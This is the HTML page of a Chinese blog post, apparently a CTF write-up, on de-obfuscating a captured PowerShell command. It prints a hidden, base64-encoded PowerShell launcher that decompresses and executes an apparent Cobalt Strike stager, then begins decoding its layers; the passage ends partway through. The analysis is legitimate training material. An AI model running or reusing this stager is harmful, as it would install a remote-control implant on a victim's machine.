@@ -1,0 +1,738 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.jpg">
+  <link rel="icon" href="/img/avatar.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="K1nm0">
+  <meta name="keywords" content="Security">
+  
+    <meta name="description" content="苑老师公众号看到的一道题。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一道Powershell代码混淆的CTF题">
+<meta property="og:url" content="https://k1nm0.com/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/index.html">
+<meta property="og:site_name" content="洞爷湖">
+<meta property="og:description" content="苑老师公众号看到的一道题。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://k1nm0.com/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/image-20210506114133488.png">
+<meta property="og:image" content="https://k1nm0.com/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/image-20210506114427053.png">
+<meta property="og:image" content="https://k1nm0.com/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/image-20210506114917030.png">
+<meta property="og:image" content="https://k1nm0.com/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/image-20210506152241767.png">
+<meta property="og:image" content="https://k1nm0.com/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/image-20210506152421262.png">
+<meta property="article:published_time" content="2021-05-06T03:33:23.000Z">
+<meta property="article:modified_time" content="2021-05-06T07:31:09.695Z">
+<meta property="article:author" content="K1nm0">
+<meta property="article:tag" content="学习">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Powershell">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://k1nm0.com/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/image-20210506114133488.png">
+  
+  
+  
+  <title>一道Powershell代码混淆的CTF题 - 洞爷湖</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"k1nm0.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":120,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading2.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":"enable","follow_dnt":true,"baidu":"c274d8260883201e6d0377b9f78ad60f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?c274d8260883201e6d0377b9f78ad60f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>洞爷湖</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/wallpaper.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="一道Powershell代码混淆的CTF题"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-05-06 11:33" pubdate>
+          2021年5月6日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          21k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          178 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">一道Powershell代码混淆的CTF题</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="0x01-题目">0x01 题目</h2>
+<p>**题目：**蓝军捕获了以下代码，要求解出CS连接的服务器地址和端口！</p>
+<p><em>注：代码很长，直接复制到本地再看</em></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">%COMSPEC% /b /c <span class="hljs-built_in">start</span> /b /min powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-encodedcommand</span> JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWAA2ADMATwBpAFMAaABiAC8ASABQADgASwBQAHEAUgBLAEwAVQAyAEMAagA1AGcANABXADEATgAxAFYAVQBCAFEAUQBCAFQAZgB1AGEAawBVAGoAeABaAFIAbwBIAGsAMABLAE4ANgBaAC8ALwAwAGUAVQBIAE0AegBPADUAbgBkAHEAZABxADEAaQByAEsANwBPAGMALwBmAGUAZgBSAEIAUgBlAFIATwBKAGEARgB0AEUAQQBtAGIAaQBMAHEAYgBvAHoAQwB5AHMAVQBmAFYAQwA0AFYAYgBCAGcAdQBFACsAawByADkAVQBTAHgAcwBZAHMAOABnADIAWABHADIAZQBMAE0AUQBlAGYATgBEAGIATAB4AHAAcABoAG0AaQBLAEsATAArAEsAdAB3AG8AVwBxAGkANQBWAE8AawAyADAAYwBJADMARgA1AHUAeABnADYAcABVAHYAcwBrAEkAawBSAG0ASABxAEgAeAB6AFUANwBqAEoAagAyAEkAdgAwAGoAYgBvAHoAZABPAEkAbgBhAEEAMwBGADUARQB0AE4AaQBOAFEAVgBIAHIAcAArAEQANgBEAFgAYwAzADIAWAByADkAOAA2AGMAVgBoAGkARAB4AHkAMwB0AC8AMwBFAGUAbABFAEUAWABKADEAeAAwAFoAUgBxAFUAeAA5AG8AeABaAGIARgBLAEsANwBrAGIANQBEAEIAcQBIACsAbwBtADcAZgA3AHYAcwBPADEAagBYAG4AUQBwAGIAMgBOAEcATQBMAEQAbgBVADgATQAzAHMAbgBZAGsAUABMAFAATABoAFgAZgBjAGMAbQBwAGUASwBmAGYAeABiAEwATAAzAGUAMQAxADMAcwAyAGkARABVAG4ASwBoAFgAVgBOAEMATABJAHYAVABjAGQAcAAxAGkAbQB2AHAAYwB6AGgAZABQAFUAUgA2AFcAaQBaAEIAcwBoAGoAdgBDAEcAMwBDADkAcwByADEARwAvAG4AKwBYAFcAeQA3AG4AeAAwAHQAbgAyAFkAdgBuAGkAbQBlAFYAcgA0AE0AZQB2AG4AYwB5AGsAbgBuAGwASwBSAFYAZwBxAGcARQAzAG4AagBHAEcAeABTAHIAMQBrACsAbAA1AGUAWAA2AGsALwAzAHEAMgBaAHgAQgA2AHgAWABYAFEAdgBlAEEAUwBGADIARgBkAFIAbQBOAGcARwBpAHUANQA1AHoAVABNAGQATgBFAEUAYgBZAEMAdABHAEUARAA3AFAASwBwAGIAQgBpAEIAQwBSAE8AUABTAG8AcQB5ADMAQQBsACsAQQA5AEsAdAAxADYAcwBlAE4AVQBRAGUANwBMADcAOABwADkATABjAG4AbwBjAEEAWAAzAGQANQBsAEsASAA1AG0AQQBTAGkARgBoAHUAWAByAEoAaQBkACsAQgBRADgAcgB6ADUAaQB3AE8AMwBQAG4ASgArAGcALwBKAFYAWQBiAGYAVAB3AGwAVwBMAG4AdwB2AGYASgBLAHEASgBuAEsAUQBwAFIASAAwAFIAZwBEAGYARAA3AGwAYQB1AEwAbAA1AHkAWgBjAEkALwBDAGsAcABPAEwASgB6AHYAcQA4AFUAWABhAFUAawBNAEUASQBqAE8ARQB5AHoAYwBFADcARABHAEoAVgBmAC8ANABuAFAAVwBlADIAVgBNADYAcgArAFUAbABEAHQAeQBuAFgAaABPAFkAZgBuAGIATQBkAFgANgBtAFcATwBiAGYATwAxAGMARgBNAHUAWABMAEkAbgBPADMALwBUAFkAOQBzAHgAVQBaAGkAOQAvADMAVQAxAE0ARwBoAGoAZQA0AGgASgBQAGMAMgAxAGoAVwB2AEMAbAB6ADYATABHAGQAbwA0AEsATQBmAGoALwBrAG8AbQBnADUAMgBsADQAdQBVAEYATQBwAGsATABPAHMAVQBNADAASgBlAGYAMgBWAGoAWABKAHUAKwA4ADMAYgBOAHgASABRAFAAaQBIAG8ARgBWAGsAQgBMAGwASAA0ADAANQB4ADcAQgBVAEYARAB3AEoAdQBZAEQAZgBlAFEAOQBwAGUAcgB1AEIATQBrAE4AWAA2AGsAdABwAHAAVgBmAHQAMgBUADcATAA1AFoANgBqAFIAVgBHAFYAVQBtAEsAbwBjADYATgBLAHEAVQBoAHoAawBGAG0AbABPAGwANQBrAFgAMQA1ADEAWQBvAEwAegBaAGYARQBmAGMANgBYAFkASQBiAGEAaABSAGUAUQBxADcAcgBYADgAQwBhAFEAWAAxAFQAMwBzAFEAYwBYAEUAQgBrAFEAWABZAEoAaQBxAFAAagBKAHMAegBjAGwAUQBxAFYASwA4AGIAYQBKAHUAcQB0AHIAVwAxAFkAVABpAHAANQBqADAATgBNAGUAQgBrAGcATgBKAEMAYwBRAEUAVABqAEkAcwBWAEoATABsAFQARwBoAFcALwB6ADAALwB5AHYAYwBxAEkAbwBMAHIATwA4AGcARgA2AHIAdwBMAGMAWQA1AG0AUQBjACsANQBWAEYAUwBlAGIAcABxAEYAegBPAEoALwBNAFAAdABhAEoAKwBlAGkAeQBMAEMANgBnAHYAVABCAGEARQBnAEEAMQBjAEcAawBTAHMAMwB0AGsARQBCAGYASwAxAFoALwBTAHIAegAvAHoAYgB3AGYAVwA4AHcAUABaAHYAWgBDAGQAQQBsAGsASwBTAC8ARQBsADIANQBLAHMAbgBMAEoASwBZADMAcwBjAHYAbgA2AGoAbQBXAE8AWABFAGcAQQBOAFMANwBFAGIAbABlAEwAVQBLAHUAcAA1AG0AMgBzAFYARwB3ADgAeAA0AEcAUQBTAHIAdAB4AEsAKwB5AHoAQwBjAGMASABQAEQAdQBGAEoANABHAG4ARQBYAEMAcwBLAEEANABtAGYAbgBjAGkARwBtAHcAOABVAG4AaAA2AHMAQgBIAEcAegAwAHcAegBQAHMAUgBDAFAATwAzAFMARABZADQARwB1AGwAUABRAFoAegBkAEMATQBzAEsAcgBXAHUAdwAyAGEANgBZAHYASgBEAEsAYwBSAFUAOABCAEgAegBGAEMAdwBuAFQANABlAG8AQwA1AGwAbQBXADMATAAzAEwATwAvAEcAUAA5AFUATgBPAFgAQQB2AGUAawA5ADcAawBtAFAANAArADQAagBKADQAWABrAGkANABYADkATgBvAFkAMQBnADkAQwAwAHMATQBEADQASAB0AHUAKwBWADcAMwBZAEQAWQBSAE8AMgBpAGgAcABXAGcAYwBHAHUAUQBaAGEAZABZAHgASABjADQAcgBLAGwAMwByAHoAMQBOAFoAbgBMAE8AKwByAEgAcQBtAHEATgBmAEcAMwBFAEEAKwAxAFYAUAB3AEMAZgB4AFMARwAvAHkARQBOAHUARgBSAGoAMAA1AHQAZwBhAGQARwBPAHcAcgA0AHoARgAvAFUARgBRAFAARABHAHcAdwBFAGYAcABDAHEAagA1AFkAdABwAFAATABCAG8AQQBrAGQAaABDAGUAbgBvAGEAeABQAGEAZgBBAE0ALwBIAEkAVABNAEQAbQBxAHEAVABSAHAAdABzAHkAagBzAGUAUQBPAHgAbABJAFcAVQAzADQAbAA5ADAARgBIAEUAQwArAHMASgBpACsATAArAE4AagBaAEMAYQAyAFEAVQBWAFgAegBwAEUANgBQAE4AYgBXADIAZABoAEoAdABhAGIAUwA5AFEANgA1AGYATgBZADgASABjAHgAYQBOAEIAbABPAHkAYQBpAGkAYQAyADAAeABUAHIANgBVAEsATwArAEUAbwBHAGoANgBaAEwAdwBlAHQAVQBFAHQANwB2AG0AZwBqAHYAYgBzAGgAbQBkAHkAQgB1AEwAWQBHAGIAUgBiAFcATABEAG4AUwBxAGoAcABKAFQAZABEAHIAOABGAE4AbQBDAEgAcQA5AG4AaQBTAEIARAA5AG8AagB0ADkAcQBqAGgAagBKAGMAeQBDAGUAagAwAFIAVwBOAE4AQgBUAEEARAAyAFgAWQBzAGsASAAyAE0ANQBFAGEAYwBNADcAMAAxADQAOABtAE8AOQB1AHAANwBBAEcAYgBnAHMAWABpAHcAWABCAHAAdABaAGEAUAB3AFUAbgBoAG4AWgBvADkAcQB1AGwAeAB2AHoASwBQAGUANgAyAFEAKwBCADcAbQBtADcAWABBAHEAbABmAEEATwBkAFAAdgAxAEsAZgBtAGIASQBrAGQAdgBrAEkARwBEACsANQBzADEASAByAFUAMAAvAGoAQgBQAEQANwBJAHcAQgAwAFIAMQBuAG0AbwBLAGEANgAvAFEATAA0AHoAbwBqAGQAcwBxAE0AcgAxAEcAYgB1AGUATQBPADYAQQBuAGUAeAByAHkALwA1AFkAagBxAGUAYwBNADUAegBTADcAUgA3AFQAWABjAG4AcwBRAFIATABIADcASABFADAAbwB3AGQATABkAGMAOABwAGsANgAzAEYANgBGADQAMwBXAEYAdQBTAHgAawB5AGsAVgBhAGMAeABHAFUANQBuAHAAagBUAG4ATwBvAHkAKwBOAEIAaAB1AFQASwB2ADkAagB0AHkAWQB6AFgAdwArAGsANQBmAEwATwBGAHIATQBhAG4ARQBNADEAbAB1ADgATQBoAHIAbQAxAGgAagBqAGUASwBnAHEAegBiAGsAZgBjACsAcgB3AGEAUwBLADEAVgBpAHYATQBMAHEAeABIAFcAVwBtAHAANwBUADAAegBTAFoAKwBTAFcAcQBYAHQAdABKAGEASgB0AGwAbgB2ACsAOAA5AE4ATABuAEEAbgBzAFQAbQBXAEoAVgA2AGUASQAxAFoAcQBMAHgAUgBtAEYAaQByADkAVQA1AGUAdgBrAC8AWABhAGwALwBaAGEANQBMAFcAUwBQAGgAdgA0AHMAagArAGIANwBlAHkAdABQAGYAYgAyAGsASABnADQARwBUAHoATwBEAHIASwA4ADYASgBLAGwAdQBlAGgAdQBCADAAKwBDAEsAZwA3AFgAUQBhAHQAegBXAE0AbQA0AFYAMgBIAG8AcgBiADcAcgBIAHAALwBkADkASQBqAEcAegBsAE8AMABhADIAKwBSAEkAZABhAEcAKwAwAEUAOABxADcAdAA2AHgAVwBHADIAeQB0AEsAYQBWADgAWQBLAHIANgBkAHkAZQByAFEAVwBkAGIARgBqADkAcABkAEQAcQBiAC8AcgBIAEMAYgBNAFkATQBOAEgALwBuAFQAagB1AHkAZAA5AHUAdABuADUAZgBXADAAZABJAG8ANQBPAFAARwAvAGsASwByAE8AdwBWAHgAbgBqAFYAUwBCAEwAYwB6AEoAegA5AG4AaAB5AGUAbABEAFcAagBqAEoAZAByAEMAdQAxAGoAYQBpADIAUgBpAEcAeQBWAGwATwB6AGYAdwBwAFkATABuAEUATgBsAHIARAAxADUASQBpAE0AcAAyAEIATABGAHMASgBPAGIAWQA4AFcAMQBoAEoAeQBjAGUALwBzAEkASQA5AFAAawBOAE0AaQBQAEQAdQBoAE0AUgBGAFIAMAB6AHcAYwBJAGMAZQBpAEEAYwA1AHEAWgBTAGMAawBmAG0AbwBNAFEAOQBaAGsAbwAxADAASAA5AGcAWQAvAEYAeQBWADkARQBSAHoATQBVADkAMgBQAEkAZQB5AGEAdABSAGYAaQBIAHQAUwA0ADMAawBjAFYAUgBnAHoASQBFACsAUwBkAHMATwB4AGIAOQBLAFIALwBvAEgAWABXAGcAcABqAFoAZQBkADEAWgBXAGYAZgBhADQAQgBEAG0AawBXAE4AMgB4AC8AKwBMAGcAdgA4ADcAaAAxAEQAdgAvAFEAbQA2AEUAagBTADgANwBMAHgAUwBLAFcAZAB6AHcAdgB1AGIAbAA5AHYAagA2ADMAVwB1AGUAOQAvAGYANgBVAGUAUQAxAG4AagBNAGUAbAAzACsASgB0AEUAKwBkAEwAaABmAEQAVQB1AFMARgBrAFoAYgB6AFkASABPAEIAdwBQAFAAOQBiAHIAaQBjAE0AaABkAHgAaABZAEYAMgB4AGwASABxAGYAVAA1AHAATAAxAEgAbwBZAGMAYwBtAEUASgBoAFQAcgAwADIAKwBZADcAagBZAEMATQBiAHQASAA0AHgAOABjAEQAWQBkAHgANwBHAFgAdQBFAHkAbQA4AEcAeQBVAGYAOQAwAFYAYQBiAGUAQwBXAEcANgBPAHYAdQBrAHgANQB0AE4AUABvAHgAYwBQAEwAegBPAFoARgBmAEMATAAxAC8AVwA0AEYANwAxAEEANABnAGkAOABpAHkAeQByAFYATAAwAHMAVQBIAFQAZABQAGIAZgBwAE0AdQBGADMANABlAGwAaAAvADIAMAA5AEMANgB1AG0AZwAxAGoASAB5AHoANQBxAE0AbgBKAE4AWgBVAHYANgBJAGUAeAA1ADYATAAvAFkAdwBCACsAVQBQAHIAZgBvAGMAMwBBAHkAKwBlADUAZAArAGgAeQBnAHoANwBIAHEAMQB3AG8ALwBsAEUAbwBDAEIAdgBxAHcAMwBsAGsAbgArAEIAcgBCAFEAWABVAGMANQA1ADcARQBkAEYAQwBjAHIAZgBEAE8AbgB6AGEANQBIAGQAMQA2AFYAWQByAFUAdwBLADcAcABHADQAMQA2AGoAdAAxAEIAKwA1ADEAbwBrAFkAZAB2AG0AOQBDAEsAOAA0AHUAYgB1AHIAOAB1AGYAYQBOAE8AbQBqADIAbQBmAEUAYgBOAFUARQBHAGcAbgBIADcAYgBvAEIAMQB5AEYASQBFADgAMQBjAG0ATwBoAGUAUwBFAGMAUABaADMANABXAEQAVwBDAGoALwBEAFEAQQBBACIAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA<br></code></pre></td></tr></table></figure>
+<h2 id="0x02-过程">0x02 过程</h2>
+<p>后面的密文盲猜一个base64，用网上的解密工具试了一下有空格，干脆在Kali里面去搞。</p>
+<p>粘贴密文保存成secret文件，方便在命令行base64解密。</p>
+<h3 id="第一次解密">第一次解密</h3>
+<p>第一次base64解密后结果为：</p>
+<p><img src="/2021/05/06/%E4%B8%80%E9%81%93Powershell%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E7%9A%84CTF%E9%A2%98/image-20210506114133488.png" srcset="/img/loading2.gif" lazyload alt="第一次解密"></p>
+<p>发现里面又有base64密文：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs base64">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<br></code></pre></td></tr></table></figure>
+<p>密文带有斜杠，解密八成是乱码：</p>
